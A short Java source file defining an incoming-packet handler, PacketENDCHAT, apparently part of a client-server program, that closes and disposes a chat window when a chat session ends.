package com.redpois0n.packets.in;

import com.redpois0n.Connection;

public class PacketENDCHAT extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Connection.frameChat.setVisible(false);
		Connection.frameChat.dispose();
		Connection.frameChat = null;
	}

}
